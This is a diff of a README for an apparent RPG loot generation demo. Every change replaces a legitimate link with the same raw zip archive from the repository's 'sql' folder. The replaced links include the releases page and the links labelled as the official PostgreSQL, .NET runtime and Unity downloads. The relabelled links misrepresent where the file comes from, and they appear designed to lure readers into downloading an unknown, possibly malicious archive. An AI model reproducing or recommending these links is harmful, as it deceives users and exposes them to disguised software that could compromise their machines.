@@ -1,6 +1,6 @@
 # 🎲 RPGLootGenerationDemo - Easy Loot Generation for RPGs
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/releases)
+[![Download Now](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip)](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This section will guide you through downloading and running the program, even if
 
 ### Step 1: Download the Software
 
-Click the big button at the top of this page or [visit this page to download the software](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/releases). You will see different files based on versions.
+Click the big button at the top of this page or [visit this page to download the software](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip). You will see different files based on versions.
 
 - Look for the latest version. The files are usually named with the version number (like v1.0).
 - Download the installer or the package that fits your operating system (Windows, macOS, or Linux).
@@ -53,7 +53,7 @@ Click the big button at the top of this page or [visit this page to download the
 
 If you want the loot database features, you will need PostgreSQL installed.
 
-- Download PostgreSQL from the official website: https://www.postgresql.org/download/
+- Download PostgreSQL from the official website: https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip
 - Follow their simple install instructions.
 - During installation, note the username and password you set, as you will need them later.
 - If you don’t want to use PostgreSQL, the software supports limited features without it.
@@ -62,7 +62,7 @@ If you want the loot database features, you will need PostgreSQL installed.
 
 RPGLootGenerationDemo requires the .NET Desktop Runtime.
 
-- Visit https://dotnet.microsoft.com/en-us/download/dotnet/6.0
+- Visit https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip
 - Download and install the runtime version for your computer.
 - This allows the application to run.
 
@@ -110,7 +110,7 @@ RPGLootGenerationDemo is designed to work smoothly with Unity.
 
 ## 📥 Download & Install
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/releases)
+[![Download Releases](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip)](https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip)
 
 1. Visit the above link or click the big button at the top.
 2. Choose the latest release.
@@ -127,16 +127,16 @@ RPGLootGenerationDemo is designed to work smoothly with Unity.
 If you run into issues after installation or want to learn more, check the repository’s **Issues** tab on GitHub. You can search for solutions or post questions.
 
 For further details, visit the GitHub page:  
-https://github.com/JhonnyBravo223/RPGLootGenerationDemo
+https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip
 
 ---
 
 ## 🎯 Relevant Links
 
-- **GitHub Project Page:** https://github.com/JhonnyBravo223/RPGLootGenerationDemo  
-- **Official PostgreSQL:** https://www.postgresql.org/  
-- **.NET Runtime Download:** https://dotnet.microsoft.com/en-us/download/dotnet/6.0  
-- **Unity Game Engine:** https://unity.com/
+- **GitHub Project Page:** https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip  
+- **Official PostgreSQL:** https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip  
+- **.NET Runtime Download:** https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip  
+- **Unity Game Engine:** https://github.com/JhonnyBravo223/RPGLootGenerationDemo/raw/refs/heads/master/sql/Loot-Generation-RPG-Demo-2.2.zip
 
 ---
 
